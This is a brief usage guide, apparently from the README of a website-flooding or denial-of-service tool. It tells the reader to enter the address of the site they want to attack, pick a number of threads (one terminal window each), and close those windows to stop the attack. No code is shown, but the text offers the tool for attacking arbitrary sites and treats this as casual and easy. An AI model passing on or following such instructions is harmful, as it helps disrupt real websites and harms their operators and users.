#### ❓How to use it❓

🟢 Everything is very easy, 
   1) Just enter the address of the site you want to attack for the template and press Enter
   2) Next, enter the number of threads, but keep in mind that one thread = one terminal window, so don't overdo it
   3) Thats all! If you want to stop the attack, or reduce the number of threads, just close the new terminal windows
